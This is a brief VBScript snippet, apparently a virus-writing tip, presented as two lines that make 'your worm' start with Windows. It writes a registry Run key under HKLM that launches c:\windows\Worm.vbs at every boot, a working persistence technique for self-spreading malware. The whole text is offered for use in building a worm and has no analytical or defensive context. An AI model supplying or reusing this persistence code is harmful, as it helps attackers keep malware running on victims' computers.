With this two lines your worm will start with windows.
_______________________________________________________________________
ŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻ
Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm", "wscript.exe c:\windows\Worm.vbs %"
_______________________________________________________________________
ŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻŻ